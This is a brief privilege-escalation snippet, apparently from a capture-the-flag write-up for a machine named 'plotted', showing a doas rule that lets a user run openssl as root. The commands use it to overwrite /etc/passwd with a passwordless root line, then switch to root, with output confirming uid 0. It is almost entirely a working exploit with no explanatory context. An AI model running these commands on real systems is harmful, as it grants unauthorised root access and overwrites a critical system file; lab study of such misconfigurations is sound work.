- - -
### /usr/bin/doas

```sh
user@plotted:/tmp$   cat /etc/doas.conf
permit nopass user as root cmd openssl( or something else)

user@plotted:/tmp$  cp /etc/passwd /tmp/

user@plotted:/tmp$  echo "root::0:0:root:/root:/bin/bash" | doas openssl enc -out /etc/passwd

user@plotted:/tmp$  su

root@plotted:/tmp#  id
uid=0(root) gid=0(root) groups=0(root)
```

- - -

